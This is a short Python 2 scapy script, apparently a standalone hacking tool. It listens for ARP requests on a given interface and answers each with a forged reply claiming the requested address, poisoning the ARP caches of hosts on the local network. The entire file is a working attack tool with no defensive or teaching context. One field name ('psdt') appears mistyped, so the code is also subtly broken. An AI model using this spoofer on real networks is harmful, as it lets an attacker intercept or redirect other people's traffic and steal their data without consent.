#!/usr/bin/python 

import sys
from scapy.all import sniff, sendp, ARP, Ether

if len(sys.argv) < 2:
	print sys.argv[0] + "<iface>"
	sys.exit(1)

def poison_call(packet):
	if packet[ARP].op ==1:
		answer = Ether(dst=packet[ARP].hwsrc) / ARP()
		answer[ARP].op = "is-at"
		answer[ARP].hwdst = packet[ARP].hwsrc
		answer[ARP].psrc = packet[ARP].pdst
		answer[ARP].psdt = packet[ARP].psrc

		print "Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me!"

		sendp(answer, iface=sys.argv[1])

sniff(prn=poison_call, filter="arp", iface=sys.argv[1], store=0)
